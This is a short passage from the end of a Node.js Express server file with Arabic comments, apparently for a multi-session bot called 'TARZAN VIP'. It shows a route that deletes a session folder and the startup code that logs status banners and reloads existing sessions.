        fs.rmSync(sessionPath, { recursive: true, force: true });
        res.json({ message: `تم حذف ${sessionId}` });
    } else {
        res.status(404).json({ error: 'الجلسة غير موجودة' });
    }
});

// ==========================================
// 🚀 تشغيل السيرفر
// ==========================================
app.listen(PORT, async () => {
    console.log(`\n=========================================`);
    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
    console.log(`🛡️ تم تفعيل نظام الحماية من الانهيار (Enterprise)`);
    console.log(`🧠 الكاش المدمج وإدارة الذاكرة تعمل بكفاءة لـ 100+ جلسة`);
    console.log(`📚 تم تحميل ${commandsMap.size} أمر`);
    console.log(`=========================================\n`);
    
    await bootExistingSessions();
});

module.exports = app;
